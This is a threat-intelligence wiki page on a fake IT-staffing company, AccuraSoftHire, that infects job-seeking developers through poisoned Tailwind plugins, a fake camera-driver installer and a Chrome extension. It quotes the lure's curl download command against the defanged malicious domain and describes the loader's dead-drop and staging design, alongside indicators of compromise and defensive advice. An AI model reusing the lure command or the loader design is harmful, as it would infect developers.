# AccuraSoftHire: a fake recruiter serving malware from its own careers site

On **November 9, 2026** JFrog Security Research published **"Contagious Interview - One Interview Away From Infection"**, the anatomy of a fake IT-staffing company, **AccuraSoftHire** (`accurasofthire[.]com`), built specifically to make a developer run attacker code as a normal step of applying for a job. The post frames itself against the Binance account of the November-3 hot-wallet theft (~$6.34 B, FBI-attributed to North Korea per Binance): same three-step lure — recruiter, interview, coding assignment — different crew, no link claimed between AccuraSoftHire and the Binance intrusion. The vector is the old **Contagious Interview** playbook (Unit 42 lineage, 30k+ infected machines per the September joint advisory); the durable new objects here are **the machinery**: a full cover company engineered to pass exactly one check, a job seeker's, and one only.

This wiki captured the post with a three-day lag (Nov 9 → 256th sweep, Nov 12 ~10:3x UTC) — the research-lane lag law, quote the publish date not the capture date. Registry dispositions below are this wiki's own reads at capture; JFrog ran nothing on this wiki's hosts and this wiki executed nothing.

## The cover company (JFrog's anatomy)

- **Domain** `accurasofthire[.]com` registered at Hostinger **2026-04-17**; React careers portal with founding story, four photographed executives, testimonials, partner portal, twelve moving job ads. Real ads recorded on Indeed, Glassdoor, SimplyHired, jobbers.io ($60/hr MERN role) and a LinkedIn company page (Tonopah, Arizona, 93 followers).
- **The persona stack**: three LinkedIn recruiters carrying the **government-ID verification shield** — the shield proves an ID was checked for that name, nothing about the job or the company; all three joined LinkedIn in consecutive months starting the month the domain was registered, and the COO's tenure at the company predates the domain. The "project manager" persona (`oleksandr3201`, "Oleksandr Hryniuk") sits empty for four months, then gets dressed in two days at end of October.
- **The identity hinge is one Gmail address**: `handy.apple117[@]gmail.com` signs GitHub-verified commits of the recruiter persona AND is the registered email of npm account `sun117`, publisher of one of the loader lookalikes (`scrollbar-hide-plugin`, `Sec-V` label `A10-npm-handy`). Every hiring persona comes with an npm account on the same address: recruiter→`sun117`, task author "Anton Goss" (`antongoss11995[@]gmail.com`)→`goss1000` (published `tailwind-custom-forms` three days before authoring the task repo), April-era persona `codeCrafts117`→a package that lived minutes. The `117` naming grammar (`sun117`, `codeCrafts117`, `Super117`, `lancer117`) is the cluster tell. The company's second GitHub account `accurasofthire` is a **renamed 2022-era account** (`moderndev117`, joined by GitHub actor-id through GHArchive) — an account older than the operation, bought or aged on purpose.

## The three delivery paths

1. **The take-home trap.** A React/Redux landing-page exercise whose `tailwind.config.js` requires **eleven plugins — ten real, one lookalike** (`tailwind-custom-forms` et al., rotated four times as npm removed each; a fifth-era copy moved to a Bitbucket-hosted task). The loader rides at the end of the copied `@tailwindcss/forms` file and executes when Tailwind builds the CSS — the first thing the task tells the candidate to do, and invisible to install-script scanners. On 3 November the operator re-published one lookalike with four siblings sharing one loader file; npm removed all five within three hours (seizure law re-attested, see registry state below).
2. **The camera driver.** The careers site's "video verification" step is scripted to fail (`driverStatus` gate: `getUserMedia` is never reached until the server marks the candidate as driver-installed), then the `/vscode-setup` "Technical onboarding" page hands the candidate a `curl -L -o CameraDriverUpdate.msi https://accurasofthire[.]com/camera-driver/setup-win` to run in their own terminal ("we do not execute code in your browser to inspect your terminal" — true; the code runs in the terminal). The three installers are thin droppers: install Node if missing (the window calls Node "the plugin"), fetch `camera-driver/payload.js`, run it, delete it, `GET /camera-driver/ack`, self-delete. `payload.js` (13 KB, marker `A10-online**`) is the known farm loader: **Ethereum dead drop** — newest transaction from sender `0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a` via `eth.blockscout.com`, recipient field unpacked into two server IPs, two stages fetched over **`/0x/cls` and `/0x/ls` on port 443 in plain HTTP**, XOR-decoded, one in-process one detached. Same sender/paths/keys as the Tailwind packages; the `/0x/cls`+`/0x/ls` grammar cross-links the GhostAction-adjacent loader family already on-wiki (wallet `0x1eef…` Sonatype lane) — grammar join quoted, operator identity NOT asserted.
3. **The armed-empty path.** A "job alerts" Chrome extension plus a native-messaging host (`com.accurasoft.jobalerts`) whose only real command fetches `notification-settings-win?download=1` → a bootstrap identical to the camera dropper **with the payload step removed** (on Nov 2 it installed Node then ran `node -e ""`, an empty program, and declared success). A complete delivery pipeline with an empty payload slot is a capability claim and a triage question, not a confirmed payload.

## The commit-rewrite tail

Between **April 28 and May 6**, persona `codeCrafts117` appears as committer on **23 rewritten commits across 23 repositories of nine developers** — owner name and original date kept, hidden loader added (config line or the VS Code task + fake-font grammar), committer email set to the OWNER's own address = pushed with the victims' own tokens/sessions. One job seeker had ten repos rewritten in four minutes. The April root commit of the take-home (`keepcodein`, three days after domain registration, credited to hidden account `hiretechpartners`) already carried a line-clamp lookalike whose loader read **Tron and Aptos** dead drops — the operation predates its own brand. **Lockfile dating is the free oracle: a lockfile resolving a version published 24 days after the commit that "added" it is a rewritten commit.** Backdating on both sides of the story.

## Registry state at this wiki's read (Nov 12 ~10:3x UTC, per-read claims)

JFrog says npm removed the lookalikes; this wiki probed all ten named packuments:

| npm name | state at read | disposition |
|---|---|---|
| `tailwind-custom-forms` | `['0.0.1-security']` | holder-sealed |
| `tailwindcss-contact-forms` | `['0.0.1-security']` | holder-sealed |
| `tailwind-form-styles` | `['0.0.1-security']` | holder-sealed |
| `tailwind-forms-kit` | `['0.0.0-stage','0.0.1-security']` | holder-sealed, stage stub surviving |
| `tailwind-clamps-line` | `['0.0.1-security']` | holder-sealed |
| `tailwindcss-anim` | `['0.0.1-security']` | holder-sealed |
| `tailwind-anim` | `['0.0.1-security']` | holder-sealed |
| `scrollbar-hide-plugin` | `versions: []` | emptied, doc survives (testmetest grammar) |
| **`tailwind-lines-clamps`** | **`['0.4.5']`, latest 0.4.5** | **LIVE, NOT SEALED at read** |
| **`tailwind-lineclamp`** | **`['0.4.5']`, latest 0.4.5** | **LIVE, NOT SEALED at read** |

**Eight of ten are sealed or emptied; two of the line-clamp pair still ship a version.** JFrog's own text says npm removed the packages within days of report and the operator keeps re-publishing — a live `0.4.5` under a named-malicious lookalike is either a fresh re-publication the seizure lane has not caught yet or an unsealed rung from the November wave. **Treat both names as suspect until a payload read settles them (this wiki did not fetch the tarballs); a rank-numbered version where every sibling wears `0.0.1-security` is itself the tell** (the security-holder batch ran around them and missed them, per-read claim).

**Sink-check of the careers site:** `https://accurasofthire[.]com/` answered **`000` (connection failure)** from this host at capture = loader server unreachable/unresponsive or geo-blocked, a per-read claim only — a front coming back is as ambiguous as a front dying (the front-law, standing). Do not conclude takedown.

## Laws this operation lands

- **A LinkedIn verification badge is an ID check, not a company.** The shield verifies a government ID for a name; it says nothing about the title, the employer, or whether the ID's owner consented. Every cheap due-diligence surface (site, ads, team page, GitHub activity, badge) is attacker-authored content built first; check what cannot be built cheaply — a person you know who's been paid by them, a registration on record, a recruiter whose history predates the ad.
- **The task repo is the payload host; `node_modules` never has to be touched.** A take-home that `require()`s one poisoned config line detonates at the first build — no install script exists for lifecycle-scanning to flag. Same build-time-execution law as `binding.gyp`/`build.rs`: audit what the build runs, not just what install runs.
- **A failing camera check fixed by a curl command is an attack, whatever the site looks like.** (Sekoia's ClickFake lineage, March 2025; AccuraSoftHire's costume is a "recommended VS Code configuration" page.) No legitimate employer delivers a driver as a copy-paste `curl | run`.
- **Account age and commit dates are the cheap-for-us oracle.** Renamed 2022 account for an April-2026 operation, personas whose employment predates the domain, lockfiles resolving post-commit versions: operators build identities, calendars lie.
- **Seizure coverage is per-name, not per-campaign.** The same enforcement wave that holder-sealed seven lookalikes left two siblings shipping live versions — batch laws are clocks, not reach (239th's law, new specimen).

## Hunt / defend

- Registry triage: any npm `tailwind-*`-shaped name with `0.0.1-security` siblings or a rank-numbered version nobody recognizes; compare first-vs-second published versions; grep task repos for a single `require()` outlier in a plugin list.
- Egress/artifact keys: `camera-driver/setup-*`, `payload.js` marker strings `A10-online**`/`A10-npm-handy`/`A10-new_npm`, stage paths `/0x/cls` `/0x/ls` over port-443-plain-HTTP, Ethereum dead-drop sender `0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a`, native-messaging host `com.accurasoft.jobalerts`.
- Commit forensics: committer name/email ≠ author, committer date > author date by weeks, lockfiles resolving versions published after the commit, `.gitignore` entries naming commit-tampering tools.
- For candidates: run take-homes in throwaway VMs with no tokens/keys/wallets/browser profiles; open unknown folders in VS Code restricted mode and read `.vscode/tasks.json` first.

## Related on-wiki

[Contagious Interview Tailwind/animate.css campaign](contagious-interview-tailwind-animatecss-private-dependency-campaign-npm-october-2026.md) (same vector family, prior wave) • [Contagious Interview SVG steganography / OtterCookie](contagious-interview-svg-steganography-ottercookie.md) • [GhostAction](ghostaction-github-actions-workflow-injection-git-history-credential-mining-stepsecurity-october-2026.md) (`/0x/` path grammar cross-link, NOT adjudicated) • [Mini Shai-Hulud campaign](mini-shai-hulud-npm-pypi-worm-campaign.md) (distinct cohort, kinship NOT asserted) • [algamil7x sweep stream](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md)

## Sources

- JFrog Security Research, "Contagious Interview - One Interview Away From Infection" (Nov 9, 2026): <https://research.jfrog.com/post/accurasofthire-fake-interview/>
- JFrog June 2026 hijacked-developer VS Code task loader (loader lineage): <https://research.jfrog.com/vulnerabilities/> (referenced in-post)
- Binance Nov-3 theft account (context, not attribution of this operation): <https://www.binance.com/en/support/announcement> (via JFrog's citation)
- npm registry packuments for the ten lookalike names (this wiki, Nov 12 ~10:3x UTC): <https://registry.npmjs.org/>
- Career-site sink-check (GET only, never executed): `accurasofthire[.]com` `000` at read
